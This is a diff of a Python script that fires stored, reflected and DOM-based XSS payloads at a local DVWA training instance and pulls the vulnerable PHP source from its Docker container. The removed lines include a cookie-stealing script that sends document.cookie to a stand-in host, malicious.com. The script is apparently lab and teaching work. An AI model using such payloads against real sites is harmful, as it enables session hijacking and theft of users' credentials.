@@ -1,45 +1,174 @@
 import requests
+import subprocess
+import re
 
-# Adjust the URL to point to the correct DVWA path
-url = 'http://127.0.0.1/index.php'
+# URLs for the XSS vulnerabilities in DVWA
+urls = {
+    "Stored XSS": 'http://127.0.0.1/vulnerabilities/xss_s/',
+    "DOM-based XSS": 'http://127.0.0.1/vulnerabilities/xss_d/',
+    "Reflected XSS": 'http://127.0.0.1/vulnerabilities/xss_r/'
+}
 
-# Replace with your actual session cookies from DVWA
+# Session cookies for DVWA
 cookies = {
-    'PHPSESSID': "b6sfs6mdktjd2ac9maq44etjq7",  
-    'security': 'low'  # Ensure the security level matches the one set in DVWA
+    'PHPSESSID': 'qlsnbhgss3unb7kvulvjclulf5',  # Replace with your actual session ID
+    'security': 'low'  # Ensure this matches your DVWA security level setting
 }
 
-# List of payloads to test different types of XSS
+# Payloads for different types of XSS
 xss_payloads = {
-    "Basic XSS": "<script>alert('XSS')</script>",
+    "Stored XSS": "<script>alert('Stored XSS')</script>",
     "DOM-based XSS": "<img src='x' onerror='alert(1)'>",
-    "Stored XSS": "<script>window.location='http://malicious.com/cookie.php?cookie='+document.cookie</script>"
+    "Reflected XSS": "<script>alert('Reflected XSS')</script>"
 }
 
-# Function to test XSS
-def test_xss():
-    print("Testing XSS vulnerabilities...\n")
-    for name, payload in xss_payloads.items():
-        data = {
-            'name': payload,  # Adjust 'name' to the parameter vulnerable to XSS
-            'Submit': 'Submit'
-        }
+# Paths to the PHP files for each type of XSS
+file_paths = {
+    "Stored XSS": '/var/www/html/vulnerabilities/xss_s/source/low.php',
+    "DOM-based XSS": '/var/www/html/vulnerabilities/xss_d/source/medium.php',
+    "Reflected XSS": '/var/www/html/vulnerabilities/xss_r/source/low.php'
+}
 
-        try:
+def test_xss(url, payload, method='POST', data=None, params=None):
+    """Test XSS vulnerabilities and display results."""
+    try:
+        if method == 'POST':
             response = requests.post(url, cookies=cookies, data=data, timeout=10)
+        elif method == 'GET':
+            response = requests.get(url, cookies=cookies, params=params, timeout=10)
+        else:
+            print("Invalid method specified.")
+            return
 
-            # Check response content or status code for more detailed analysis
-            if '<script>alert(' in response.text or response.status_code == 200:
-                print(f"XSS successful with {name}: {payload}")
-                print(f"Vulnerability Type: Cross-Site Scripting (XSS)")
+        if response.status_code == 200:
+            if payload in response.text or 'alert(' in response.text:
+                print(f"XSS successful with payload: {payload}")
             else:
-                print(f"XSS unsuccessful with {name}: {payload}")
-                print(f"Vulnerability Type: Cross-Site Scripting (XSS)")
+                print(f"XSS unsuccessful with payload: {payload}")
+        else:
+            print(f"Error: Received status code {response.status_code}")
 
-            print("-" * 50)
+    except requests.exceptions.RequestException as e:
+        print(f"Error during request: {e}")
 
-        except requests.exceptions.RequestException as e:
-            print(f"Error: {e}")
+def get_container_id():
+    """Retrieve the container ID for the running DVWA container."""
+    try:
+        result = subprocess.run(
+            ["docker", "ps", "--filter", "ancestor=vulnerables/web-dvwa", "--format", "{{.ID}}"],
+            capture_output=True,
+            text=True
+        )
+        container_id = result.stdout.strip()
+        if not container_id:
+            raise ValueError("No DVWA container found.")
+        return container_id
+    except Exception as e:
+        print(f"Error retrieving container ID: {e}")
+        return None
 
-# Run XSS test
-test_xss()
+def fetch_php_code(file_path):
+    """Fetch and return the PHP code from the Docker container."""
+    try:
+        container_id = get_container_id()
+        if not container_id:
+            print("Unable to retrieve container ID.")
+            return ""
+
+        result = subprocess.run(
+            ["docker", "exec", container_id, "cat", file_path],
+            capture_output=True,
+            text=True
+        )
+        php_code = result.stdout
+        return php_code
+    except Exception as e:
+        print(f"Error fetching PHP code: {e}")
+        return ""
+
+def extract_vulnerable_code(php_code, patterns):
+    """Extract and return all lines containing vulnerable code snippets based on the provided patterns."""
+    lines = php_code.splitlines()
+    vulnerable_lines = []
+    
+    for pattern in patterns:
+        for line in lines:
+            if re.search(pattern, line):
+                vulnerable_lines.append(line.strip())
+    
+    return vulnerable_lines
+
+def print_vulnerabilities(title, file_path, security_level, patterns, reason):
+    """Print the vulnerabilities found in a given file with a reason at the end."""
+    php_code = fetch_php_code(file_path)
+    print(f"\nVulnerable File: {file_path}")
+    print(f"Security Level: {security_level}\n")
+    print("--- Vulnerable PHP Code Snippets ---\n")
+    vulnerable_lines = extract_vulnerable_code(php_code, patterns)
+    if vulnerable_lines:
+        for line in vulnerable_lines:
+            print(line)
+        print(f"Reason: {reason}")
+    else:
+        print("No specific vulnerable code snippets found.")
+    print("\n--- End of Vulnerable PHP Code Snippets ---\n")
+
+def main():
+    # Test Stored XSS
+    print("Testing Stored XSS...\n")
+    data = {
+        'txtName': xss_payloads["Stored XSS"],
+        'mtxMessage': xss_payloads["Stored XSS"],
+        'btnSign': 'Sign'
+    }
+    test_xss(urls["Stored XSS"], xss_payloads["Stored XSS"], method='POST', data=data)
+    
+    # Display vulnerable code for Stored XSS
+    stored_xss_patterns = [
+        r'\$_POST\[\s*\'[^\']+\'\s*\]'  # Matches $_POST['input']
+    ]
+    print_vulnerabilities(
+        "Stored XSS",
+        file_paths["Stored XSS"],
+        "low",
+        stored_xss_patterns,
+        "User input is directly stored and reflected without sanitization."
+    )
+
+    # Test DOM-based XSS
+    print("Testing DOM-based XSS...\n")
+    test_xss(urls["DOM-based XSS"], xss_payloads["DOM-based XSS"], method='GET', params={'default': xss_payloads["DOM-based XSS"]})
+    
+    # Display vulnerable code for DOM-based XSS
+    dom_xss_patterns = [
+        r'\$_GET\[\s*\'[^\']+\'\s*\]',    # Matches $_GET['input']
+        r'\$_POST\[\s*\'[^\']+\'\s*\]',   # Matches $_POST['input']
+        r'\$default\s*=\s*\$_GET\[\s*\'[^\']+\'\s*\];'
+    ]
+    print_vulnerabilities(
+        "DOM-based XSS",
+        file_paths["DOM-based XSS"],
+        "medium",
+        dom_xss_patterns,
+        "User input is directly reflected in JavaScript without proper encoding."
+    )
+
+    # Test Reflected XSS
+    print("Testing Reflected XSS...\n")
+    test_xss(urls["Reflected XSS"], xss_payloads["Reflected XSS"], method='GET', params={'name': xss_payloads["Reflected XSS"]})
+
+    # Display vulnerable code for Reflected XSS
+    reflected_xss_patterns = [
+        r'\$_GET\[\s*\'[^\']+\'\s*\]',    # Matches $_GET['input']
+        r'\$_POST\[\s*\'[^\']+\'\s*\]'    # Matches $_POST['input']
+    ]
+    print_vulnerabilities(
+        "Reflected XSS",
+        file_paths["Reflected XSS"],
+        "low",
+        reflected_xss_patterns,
+        "User input is directly reflected back in the response without sanitization."
+    )
+
+if __name__ == "__main__":
+    main()
